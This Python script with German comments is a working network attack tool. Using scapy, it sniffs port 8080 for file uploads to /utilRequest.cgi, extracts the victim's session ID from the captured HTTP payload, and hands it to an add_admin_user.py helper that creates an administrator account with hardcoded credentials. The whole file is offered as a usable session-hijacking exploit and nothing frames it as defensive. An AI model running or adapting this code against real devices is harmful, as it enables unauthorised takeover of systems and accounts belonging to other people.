import re
import subprocess
from scapy.all import *

def extract_sid(payload):
    """
    Extrahiert die Session-ID (SID) aus dem HTTP-Payload.
    """
    match = re.search(rb"sid=([a-zA-Z0-9]+)", payload)
    if match:
        sid = match.group(1).decode("utf-8")
        print(f"[INFO] Gefundene SID: {sid}")
        return sid
    else:
        print("[WARNING] Keine SID im Payload gefunden.")
        return None

def execute_add_admin_script(sid, username, password):
    """
    Führt das add_admin_user.py Skript aus und übergibt SID, Benutzername und Passwort.
    """
    if sid:
        print(f"[*] Datei-Upload erkannt! Starte add_admin_user.py mit SID: {sid}, Benutzername: {username}, Passwort: {password}...")
        try:
            # Übergabe der SID, des Benutzernamens und des Passworts an add_admin_user.py
            result = subprocess.run(
                ["python3", "add_admin_user.py", sid, username, password],
                capture_output=True,
                text=True
            )
            print("[*] add_admin_user.py ausgeführt.")
            print(result.stdout)
            if result.stderr:
                print("[!] Fehler bei der Ausführung:")
                print(result.stderr)
        except Exception as e:
            print(f"[!] Fehler beim Ausführen von add_admin_user.py: {e}")
    else:
        print("[ERROR] Keine SID verfügbar. Skript wurde nicht ausgeführt.")

def detect_upload(packet):
    """
    Erkennt HTTP-POST-Uploads und extrahiert die SID.
    """
    if packet.haslayer(Raw):
        payload = packet[Raw].load

        # Prüfen, ob es sich um einen HTTP POST-Request handelt
        if b"POST" in payload and b"/utilRequest.cgi" in payload:

            # Prüfen, ob es ein Datei-Upload ist (Multipart-Form-Daten enthalten)
            if b"Content-Disposition" in payload and b"form-data" in payload:
                print("[*] Datei-Upload erkannt!")

                # SID aus dem Payload extrahieren
                sid = extract_sid(payload)

                # Admin-Benutzer-Skript starten
                if sid:
                    execute_add_admin_script(sid, "testuser", "password123")

if __name__ == "__main__":
    print("[*] Abhören des Netzwerkverkehrs...")

    # Netzwerk-Sniffer starten
    sniff(filter="tcp port 8080", prn=detect_upload, store=0)
